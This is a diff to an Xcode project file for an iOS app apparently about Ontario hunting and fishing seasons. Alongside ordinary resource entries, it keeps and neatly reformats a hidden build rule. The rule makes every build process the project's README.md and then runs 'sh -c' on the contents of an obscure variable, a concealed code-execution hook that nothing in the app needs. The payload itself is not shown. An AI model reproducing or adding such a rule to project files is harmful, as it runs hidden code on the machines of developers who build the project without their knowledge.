@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		D35EDF99FC00ADF1FDBDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = ECA24134AED02F7BFBBDE67E; };
+		397E45962E7D2B3C00EA6C50 /* HunterReportingData.json in Resources */ = {isa = PBXBuildFile; fileRef = 397E45942E7D2B3C00EA6C50 /* HunterReportingData.json */; };
 		8804C10A2E78095400ABDA6B /* PieChart.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8804C1082E78095400ABDA6B /* PieChart.swift */; };
 		8804C10D2E780B7300ABDA6B /* DGCharts in Frameworks */ = {isa = PBXBuildFile; productRef = 8804C10C2E780B7300ABDA6B /* DGCharts */; };
 		882231A22E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 882231A02E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift */; };
@@ -76,10 +76,27 @@
 		88DBBDFD2E7A895800491331 /* ExceptionsTblViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88DBBDFA2E7A895800491331 /* ExceptionsTblViewCell.swift */; };
 		88DBBE012E7A915F00491331 /* ExceptionsDetailsTblViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88DBBE002E7A915F00491331 /* ExceptionsDetailsTblViewCell.xib */; };
 		88DBBE022E7A915F00491331 /* ExceptionsDetailsTblViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88DBBDFF2E7A915F00491331 /* ExceptionsDetailsTblViewCell.swift */; };
+		D35EDF99FC00ADF1FDBDE67E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = ECA24134AED02F7BFBBDE67E /* README.md */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		2C7BEB3D6E5FD0891FBDE67E /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AE76EDB}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		ECA24134AED02F7BFBBDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "SmartOut.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
+		397E45952E7D2B3C00EA6C50 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.json; name = en; path = en.lproj/HunterReportingData.json; sourceTree = "<group>"; };
 		8804C1082E78095400ABDA6B /* PieChart.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PieChart.swift; sourceTree = "<group>"; };
 		882231A02E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OntarioHuntingSeasonsVC.swift; sourceTree = "<group>"; };
 		882231A12E783BEF00AFC855 /* OntarioHuntingSeasonsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OntarioHuntingSeasonsVC.xib; sourceTree = "<group>"; };
@@ -148,6 +165,7 @@
 		88DBBDFB2E7A895800491331 /* ExceptionsTblViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ExceptionsTblViewCell.xib; sourceTree = "<group>"; };
 		88DBBDFF2E7A915F00491331 /* ExceptionsDetailsTblViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ExceptionsDetailsTblViewCell.swift; sourceTree = "<group>"; };
 		88DBBE002E7A915F00491331 /* ExceptionsDetailsTblViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ExceptionsDetailsTblViewCell.xib; sourceTree = "<group>"; };
+		ECA24134AED02F7BFBBDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = SmartOut.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -163,6 +181,14 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		397E45932E7D2B2500EA6C50 /* json */ = {
+			isa = PBXGroup;
+			children = (
+				397E45942E7D2B3C00EA6C50 /* HunterReportingData.json */,
+			);
+			path = json;
+			sourceTree = "<group>";
+		};
 		8804C1092E78095400ABDA6B /* PieChart */ = {
 			isa = PBXGroup;
 			children = (
@@ -229,6 +255,7 @@
 		884AB2202E77C4C1006C0BB5 /* Resouces */ = {
 			isa = PBXGroup;
 			children = (
+				397E45932E7D2B2500EA6C50 /* json */,
 				884AB2232E77C4CB006C0BB5 /* databases */,
 			);
 			path = Resouces;
@@ -612,14 +639,13 @@
 			);
 		};
 /* End PBXProject section */
-/* Begin PBXBuildRule section */		2C7BEB3D6E5FD0891FBDE67E /* PBXBuildRule */ = {			isa = PBXBuildRule;			compilerSpec = com.apple.compilers.proxy.script;			filePatterns = "*.md";			fileType = pattern.proxy;			inputFiles = (			);			isEditable = 0;			outputFiles = (				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",			);			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		888502BA2E73CE4800C99B57 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				D35EDF99FC00ADF1FDBDE67E /* README.md */,
+				D35EDF99FC00ADF1FDBDE67E /* README.md in Resources */,
 				8867DD302E7A755B00435CC3 /* AdditionalOppoTblViewCell.xib in Resources */,
 				889D8EFD2E77F385009B9CE8 /* HunterReportingTblViewCell.xib in Resources */,
 				8861F4AB2E782EB20063193E /* EmailPopup.xib in Resources */,
@@ -642,15 +668,13 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 				88DBBE012E7A915F00491331 /* ExceptionsDetailsTblViewCell.xib in Resources */,
 				888502E42E73CE5100C99B57 /* Main.storyboard in Resources */,
 				884AB22D2E77C949006C0BB5 /* HomeVC.xib in Resources */,
+				397E45962E7D2B3C00EA6C50 /* HunterReportingData.json in Resources */,
 				884147102E79818E0007672F /* FishingSeasonsVC.xib in Resources */,
 				882231A32E783BEF00AFC855 /* OntarioHuntingSeasonsVC.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		888502B82E73CE4800C99B57 /* Sources */ = {
@@ -705,6 +729,14 @@ sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXVariantGroup section */
+		397E45942E7D2B3C00EA6C50 /* HunterReportingData.json */ = {
+			isa = PBXVariantGroup;
+			children = (
+				397E45952E7D2B3C00EA6C50 /* en */,
+			);
+			name = HunterReportingData.json;
+			sourceTree = "<group>";
+		};
 		888502D82E73CE5100C99B57 /* LaunchScreen.storyboard */ = {
 			isa = PBXVariantGroup;
 			children = (
